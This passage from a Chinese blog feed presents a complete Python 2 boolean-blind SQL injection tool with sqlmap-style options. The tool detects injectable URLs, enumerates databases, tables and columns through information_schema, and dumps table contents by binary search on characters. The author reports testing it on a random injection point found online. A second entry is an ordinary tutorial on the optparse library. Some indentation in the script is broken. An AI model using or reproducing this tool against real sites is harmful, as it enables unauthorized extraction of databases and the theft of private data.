(low+high+<span class="number">1</span>)/<span class="number">2</span></div><div class="line">num=input(<span class="string">"please input a number(1~126):"</span>)</div><div class="line">result=binary_search(num)</div><div class="line"><span class="keyword">print</span> result</div></pre></td></tr></table></figure><br><img src="http://pic.c1imber.top/blog/180606/cbF63CJDd7.png?imageslim" alt="mark"></p><p><strong>模型2:</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(num)</span>:</span></div><div class="line">    low=<span class="number">0</span></div><div class="line">    high=<span class="number">126</span></div><div class="line">    <span class="keyword">while</span> low&lt;=high:</div><div class="line">        <span class="keyword">print</span> <span class="string">"search zone:(%d-%d)"</span>%(low,high)</div><div class="line">        mid=(low+high)/<span class="number">2</span></div><div class="line">        <span class="keyword">if</span> mid&gt;num:</div><div class="line">            high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            low=mid+<span class="number">1</span></div><div class="line">    <span class="keyword">return</span> (low+high<span class="number">-1</span>)/<span class="number">2</span></div><div class="line">num=input(<span class="string">"please input a number(1~126):"</span>)</div><div class="line">result=binary_search(num)</div><div class="line"><span class="keyword">print</span> result</div></pre></td></tr></table></figure><br><img src="http://pic.c1imber.top/blog/180606/k8l4fCKaFk.png?imageslim" alt="mark"><br><strong>有了模型，有相当于有了一个轮子，通过模型可以更容易地编写出自己的盲注脚本，贴出我编写的盲注脚本</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbnum</span><span class="params">(url,basehtml)</span>:</span></div><div class="line">    num=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        payload=<span class="string">"%s and (select count(*) from information_schema.schemata)=%s-- "</span>%(url,str(num))</div><div class="line">        <span class="comment">#print payload</span></div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="comment">#print html</span></div><div class="line">        <span class="keyword">if</span> html==basehtml:</div><div class="line">            <span class="keyword">return</span> num</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            num=num+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbs</span><span class="params">(url,basehtml,num)</span>:</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">    length=<span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            payload=<span class="string">"%s and (select length(schema_name) from information_schema.schemata limit %s,1)=%s-- "</span>%(url,str(n),str(length))</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> html==basehtml:</div><div class="line">            s=<span class="string">""</span></div><div class="line">                <span class="comment">#print length</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</div><div class="line">                    low=<span class="number">0</span></div><div class="line">                    high=<span class="number">126</span></div><div class="line">                    <span class="keyword">while</span> low&lt;=high:</div><div class="line">                        mid=(low+high)/<span class="number">2</span></div><div class="line">                        payload=<span class="string">"%s and ascii(substr((select schema_name from information_schema.schemata limit %s,1),%s,1))&gt;%s-- "</span>%(url,str(n),str(c),str(mid))</div><div class="line">                        html=requests.get(url=payload).content</div><div class="line">                        <span class="comment">#print payload</span></div><div class="line">                        <span class="keyword">if</span> html==basehtml:</div><div class="line">                            <span class="comment">#print payload</span></div><div class="line">                            low=mid+<span class="number">1</span></div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            high=mid<span class="number">-1</span></div><div class="line">                    s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                    <span class="keyword">print</span> s</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                length=length+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gettablenum</span><span class="params">(url,basehtml,dbname)</span>:</span></div><div class="line">    num=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        payload=<span class="string">"%s and (select count(*) from information_schema.tables where table_schema=0x%s)=%s-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),str(num))</div><div class="line">        <span class="comment">#print payload</span></div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> html==basehtml:</div><div class="line">            <span class="keyword">return</span> num</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            num=num+<span class="number">1</span>        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gettables</span><span class="params">(url,basehtml,num,dbname)</span>:</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        length=<span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            payload=<span class="string">"%s and (select length(table_name) from information_schema.tables where table_schema=0x%s limit %s,1)=%s-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),str(n),str(length))</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> html==basehtml:</div><div class="line">                <span class="comment">#print length</span></div><div class="line">                s=<span class="string">""</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</div><div class="line">                    low=<span class="number">0</span></div><div class="line">                    high=<span class="number">126</span></div><div class="line">                    <span class="keyword">while</span> low&lt;=high:</div><div class="line">                        mid=(low+high)/<span class="number">2</span></div><div class="line">                        payload=<span class="string">"%s and ascii(substr((select table_name from information_schema.tables where table_schema=0x%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),str(n),str(c),str(mid))</div><div class="line">                        html=requests.get(url=payload).content</div><div class="line">                        <span class="comment">#print payload</span></div><div class="line">                        <span class="keyword">if</span> html==basehtml:</div><div class="line">                            <span class="comment">#print payload</span></div><div class="line">                            low=mid+<span class="number">1</span></div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            high=mid<span class="number">-1</span></div><div class="line">                    s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                    <span class="keyword">print</span> s</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                length=length+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcolumnnum</span><span class="params">(url,basehtml,tablename,dbname)</span>:</span></div><div class="line">    num=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        payload=<span class="string">"%s and (select count(*) from information_schema.columns where table_name=0x%s and table_schema=0x%s)=%s-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),str(num))</div><div class="line">        <span class="comment">#print payload</span></div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> html==basehtml:</div><div class="line">            <span class="keyword">return</span> num</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            num=num+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcolumns</span><span class="params">(url,basehtml,num,tablename,dbname)</span>:</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        length=<span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            payload=<span class="string">"%s and (select length(column_name) from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1)=%s-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),str(n),str(length))</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> html==basehtml:</div><div class="line">                <span class="comment">#print length</span></div><div class="line">                s=<span class="string">""</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</div><div class="line">                    low=<span class="number">0</span></div><div class="line">                    high=<span class="number">126</span></div><div class="line">                    <span class="keyword">while</span> low&lt;=high:</div><div class="line">                        mid=(low+high)/<span class="number">2</span></div><div class="line">                        payload=<span class="string">"%s and ascii(substr((select column_name from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),str(n),str(c),str(mid))</div><div class="line">                        html=requests.get(url=payload).content</div><div class="line">                        <span class="comment">#print payload</span></div><div class="line">                        <span class="keyword">if</span> html==basehtml:</div><div class="line">                            <span class="comment">#print payload</span></div><div class="line">                            low=mid+<span class="number">1</span></div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            high=mid<span class="number">-1</span></div><div class="line">                    s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                    <span class="keyword">print</span> s</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                length=length+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatanum</span><span class="params">(url,basehtml,tablename,dbname)</span>:</span></div><div class="line">    num=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        payload=<span class="string">"%s and (select count(*) from %s.%s)=%s-- "</span>%(url,dbname,tablename,str(num))</div><div class="line">        <span class="comment">#print payload</span></div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> html==basehtml:</div><div class="line">            <span class="keyword">return</span> num</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            num=num+<span class="number">1</span>       </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpdatas</span><span class="params">(url,basehtml,num,columnname,tablename,dbname)</span>:</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        length=<span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            payload=<span class="string">"%s and (select length(%s) from %s.%s limit %s,1)=%s-- "</span>%(url,columnname,dbname,tablename,str(n),str(length))</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> html==basehtml:</div><div class="line">                <span class="comment">#print length</span></div><div class="line">                s=<span class="string">""</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</div><div class="line">                    low=<span class="number">0</span></div><div class="line">                    high=<span class="number">126</span></div><div class="line">                    <span class="keyword">while</span> low&lt;=high:</div><div class="line">                        mid=(low+high)/<span class="number">2</span></div><div class="line">                        payload=<span class="string">"%s and ascii(substr((select %s from %s.%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,columnname,dbname,tablename,str(n),str(c),str(mid))</div><div class="line">                        html=requests.get(url=payload).content</div><div class="line">                        <span class="comment">#print payload</span></div><div class="line">                        <span class="keyword">if</span> html==basehtml:</div><div class="line">                            <span class="comment">#print payload</span></div><div class="line">                            low=mid+<span class="number">1</span></div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            high=mid<span class="number">-1</span></div><div class="line">                    s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                    <span class="keyword">print</span> s</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                length=length+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">testurl</span><span class="params">(url,basehtml)</span>:</span></div><div class="line">    url1=<span class="string">"%s'"</span>%(url)</div><div class="line">    url2=<span class="string">'%s"'</span>%(url)</div><div class="line">    html1=requests.get(url1).content</div><div class="line">    html2=requests.get(url2).content</div><div class="line">    <span class="keyword">if</span> basehtml!=html1 <span class="keyword">and</span> basehtml!=html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type numeric"</span></div><div class="line">        <span class="keyword">return</span> url</div><div class="line">    <span class="keyword">elif</span> basehtml!=html1 <span class="keyword">and</span> basehtml==html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type string(\")"</span></div><div class="line">        <span class="keyword">return</span> url1</div><div class="line">    <span class="keyword">elif</span> basehtml==html1 <span class="keyword">and</span> basehtml!=html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type string(\")"</span></div><div class="line">        <span class="keyword">return</span> url2</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    parser=OptionParser()</div><div class="line">    parser.add_option(<span class="string">"-u"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"url"</span>,help=<span class="string">"-u url"</span>)</div><div class="line">    parser.add_option(<span class="string">"-C"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"column"</span>,help=<span class="string">"-C column1,column2,...,..."</span>)</div><div class="line">    parser.add_option(<span class="string">"-T"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"table"</span>,help=<span class="string">"-T table"</span>)</div><div class="line">    parser.add_option(<span class="string">"-D"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"db"</span>,help=<span class="string">"-D dadabase"</span>)</div><div class="line">    parser.add_option(<span class="string">"--dbs"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"dbs"</span>,help=<span class="string">"inject all databases"</span>)</div><div class="line">    parser.add_option(<span class="string">"--dump"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"dump"</span>,help=<span class="string">"dump columns with selected table and database"</span>)</div><div class="line">    parser.add_option(<span class="string">"--tables"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"tables"</span>,help=<span class="string">"inject all tables in selected database"</span>)</div><div class="line">    parser.add_option(<span class="string">"--columns"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"columns"</span>,help=<span class="string">"inject all columns in selected table and database"</span>)</div><div class="line">    (options,args)=parser.parse_args()</div><div class="line">    <span class="keyword">if</span> options.url <span class="keyword">and</span> len(sys.argv)==<span class="number">3</span>:</div><div class="line">        url=options.url</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        result=testurl(url,basehtml)</div><div class="line">        <span class="keyword">if</span> result:</div><div class="line">            <span class="keyword">print</span> <span class="string">"this url maybe injectable"</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"this url maybe notinjectable"</span></div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.dbs:<span class="comment">#--dbs</span></div><div class="line">        url=options.url</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getdbnum(url,basehtml)</div><div class="line">        getdbs(url,basehtml,num)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.tables <span class="keyword">and</span> options.db:<span class="comment">#-u url --tables -D database</span></div><div class="line">        url=options.url</div><div class="line">        db=options.db</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=gettablenum(url,basehtml,db)</div><div class="line">        gettables(url,basehtml,num,db)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.columns <span class="keyword">and</span> options.table <span class="keyword">and</span> options.db:<span class="comment">#-u url --columns -T table -D database</span></div><div class="line">        url=options.url</div><div class="line">        table=options.table</div><div class="line">        db=options.db</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getcolumnnum(url,basehtml,table,db)</div><div class="line">        getcolumns(url,basehtml,num,table,db)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.dump <span class="keyword">and</span> options.column <span class="keyword">and</span> options.table <span class="keyword">and</span> options.db:<span class="comment">#-u url --dump  -C column -T table -D database</span></div><div class="line">        url=options.url</div><div class="line">        column=options.column</div><div class="line">        table=options.table</div><div class="line">        db=options.db</div><div class="line">        columns=column.split(<span class="string">","</span>)</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getdatanum(url,basehtml,table,db)</div><div class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> columns:</div><div class="line">            dumpdatas(url,basehtml,num,column,table,db)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="comment">#print "Please look this script help information,to use --help or -h"</span></div><div class="line">        parser.print_help()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p><p><strong>使用方法，自己使用optparse库将脚本参数设置成了类似于sqlmap的参数，下面是该脚本使用方法</strong><br><img src="http://pic.c1imber.top/blog/180605/mikhegHaae.png?imageslim" alt="mark"><br><strong>随便测试网上一个注入点来测试写的工具是否可以使用，可以看到成功注入出来了数据库，当然经过测试也能注入出表字段和数据库内容，这个工具只是初步完成了，当然还有很多的不足，这些都需要自己不断的去完善</strong><br><img src="http://pic.c1imber.top/blog/180605/KeIKGl7bmG.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python编程实现自动化注入之布尔盲注&quot;&gt;&lt;a href=&quot;#python编程实现自动化注入之布尔盲注&quot; class=&quot;headerlink&quot; title=&quot;python编程实现自动化注入之布尔盲注&quot;&gt;&lt;/a&gt;python编程实现自动化注入之布尔盲注&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;python编程实现自动化注入这个话题很有可能会写成一个系列，主要希望通过编写自动化注入工具脚本来提高自己的python代码能力和sql注入的能力，mysql数据库常见的注入分为union注入，报错注入，布尔盲注和时间盲注，这篇文章先用布尔盲注工具的编写来开个头~主要会用到optparse库去解析命令行参数，同时会用到二分有序查找算法去猜解数据库的每个字符，optparse库的用法和二分法的好处在之前的文章里都写的很清楚了，开始编写吧&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://lawlietweb.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://lawlietweb.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python optparse模块使用总结</title>
    <link href="http://lawlietweb.com/2018/06/05/pyoptparse/"/>
    <id>http://lawlietweb.com/2018/06/05/pyoptparse/</id>
    <published>2018-06-04T16:08:28.000Z</published>
    <updated>2018-12-19T11:40:54.063Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-optparse模块使用总结"><a href="#python-optparse模块使用总结" class="headerlink" title="python optparse模块使用总结"></a>python optparse模块使用总结</h1><p><strong>之前用过的一个python库，可以实现解析命令行参数实现命令行交互，最近再写自动化sql注入工具需要实现命令行交互的功能，由于好久不写，可多细节方面都想不起来了，又重新温习了一下这个库，在这里记录一下使用方法和一些容易被忽视的细节</strong><br><a id="more"></a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>首先需要导入optparse模块中的OptionParser类，这个类里面有设置和解析命令行参数的方法，然后创建它的一个实例</strong></p><pre><code>from optparse import OptionParserparser = OptionParser()</code></pre><p><strong>调用该类的add_option方法设置命令行参数</strong></p><pre><code>parser.add_option(&quot;-自定义的参数识别标签&quot;,&quot;--自定义的参数识别标签&quot;,action=&quot;store/store_true/store_false&quot;,type=&quot;string/...&quot;,dest=&quot;&quot; help=&quot;&quot;)</code></pre><p><strong>该函数里面比较重要的几个参数的用法</strong></p><pre><code>首先是第一和第二个参数作为调用时的参数的标签，会被识别action参数：action参数告诉optparse当它在命令行中遇到选项时该做什么。action有三种存储方式：store、store_false、store_true。如果不指定action的值，默认的是store，store需要在命令行中，标签后跟上参数，并将该命令行参数的值赋值给dest参数中指定的变量。如果action值为store_true，那么在命令行中，参数的标签后不需要跟参数，如果命令行中使用了该参数标签，那么该命令行参数的dest变量的值会为True，store_flase同样不需要指定参数，不过不同的是，指定为store_false的参数标签，其dest的值在标签设置时会被设为Falsetype参数type指定dest参数中设置的变量的存储类型，默认为stringdest参数里面的值为变量名，当action被设置为store时，该变量用户接受参数标签后的参数值help参数设置要显示的参数的帮助信息</code></pre><p><strong>设置完命令行参数后需要解析命令行参数，使用该类的parse_args方法</strong></p><pre><code>(options, args) = parser.parse_args()</code></pre><p><strong>该方法会返回两个对象，options为字典类型，里面存放了dest中设置的变量和其对应的命令行参数值，args为列表类型，里面存放多余的命令行参数，一个参数标签后只能跟一个参数，多余的会被存在args中</strong></p><p><strong>在python中使用命令行中的参数，解析完了命令行参数，就可以在python中直接调用了，调用方法</strong></p><pre><code>options.dest中设置的变量名</code></pre><p><strong>通过这种方式就能取到命令行中的参数值了</strong></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><strong>为了更深的理解，给出几个实例</strong></p><p><strong>实例1.action的值为store默认值：</strong></p><pre><code>&gt;&gt;&gt; from optparse import OptionParser&gt;&gt;&gt; parser=OptionParser()&gt;&gt;&gt; parser.add_option(&quot;-u&quot;,&quot;--url&quot;,action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;-u/--url url&quot;)&lt;Option at 0x268ce88: -u/--url&gt;&gt;&gt;&gt; args=[&quot;-h&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)Usage:  [options]Options:    -h, --help         show this help message and exit    -u URL, --url=URL  -u/--url url&gt;&gt;&gt; args=[&quot;-u&quot;,&quot;inputurl1&quot;,&quot;inputurl2&quot;,&quot;inputurl2&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;url&apos;: &apos;inputurl1&apos;},[&apos;inputurl2&apos;, &apos;inputurl2&apos;]&gt;&gt;&gt; print options.url&gt;&gt;&gt; inputurl1&gt;&gt;&gt; args=[&quot;--url&quot;,&quot;inputurl1&quot;,&quot;inputurl2&quot;,&quot;inputurl2&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;url&apos;: &apos;inputurl1&apos;},[&apos;inputurl2&apos;, &apos;inputurl2&apos;]&gt;&gt;&gt; args=[]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;url&apos;: None},[]&gt;&gt;&gt;</code></pre><p><strong>实例2.action的值为store_true</strong></p><pre><code>&gt;&gt;&gt; from optparse import OptionParser&gt;&gt;&gt; parser=OptionParser()&gt;&gt;&gt; parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;--dbs&quot;)&lt;Option at 0x2316048: --dbs&gt;&gt;&gt;&gt; args=[&quot;--dbs&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;dbs&apos;: True},[]&gt;&gt;&gt; print options.dbsTrue&gt;&gt;&gt; args=[]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;dbs&apos;: None},[]&gt;&gt;&gt; print options.dbsNone&gt;&gt;&gt; args=[&quot;-h&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)Usage:  [options]Options:    -h, --help  show this help message and exit    --dbs       --dbsG:\代码&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python-optparse模块使用总结&quot;&gt;&lt;a href=&quot;#python-optparse模块使用总结&quot; class=&quot;headerlink&quot; title=&quot;python optparse模块使用总结&quot;&gt;&lt;/a&gt;python optparse模块使用总结&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;之前用过的一个python库，可以实现解析命令行参数实现命令行交互，最近再写自动化sql注入工具需要实现命令行交互的功能，由于好久不写，可多细节方面都想不起来了，又重新温习了一下这个库，在这里记录一下使用方法和一些容易被忽视的细节&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://lawlietweb.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://lawlietweb.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python有序二分查找算法</title>
    <link href="http://lawlietweb.com/2018/06/04/pybinarysearch/"/>
    <id>http://lawlietweb.com/2018/06/04/pybinarysearch/</id>
    <published>2018-06-04T15:35:01.000Z</published>
    <updated>2018-12-19T11:12:58.822Z</updated>
    
